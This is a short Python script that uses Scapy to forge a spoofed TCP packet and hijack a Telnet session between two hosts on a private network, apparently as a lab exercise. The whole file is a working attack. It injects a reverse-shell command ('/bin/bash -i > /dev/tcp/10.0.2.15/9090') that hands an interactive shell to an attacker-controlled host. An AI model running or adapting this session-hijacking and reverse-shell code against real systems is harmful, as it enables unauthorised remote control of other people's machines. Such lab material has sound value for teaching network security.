#!/usr/bin/python3

import sys
from scapy.all import *

print("Sending session hijacking packet")

IPLayer = IP(src="10.0.2.4", dst="10.0.2.5")
TCPLayer = TCP(sport=35402, dport=23, flags="A", seq=1055601896, ack=3707745259)
Data = "\n/bin/bash -i > /dev/tcp/10.0.2.15/9090 0<&1 2>&1\n"
pkt=IPLayer/TCPLayer/Data
ls(pkt)
send(pkt, verbose=0)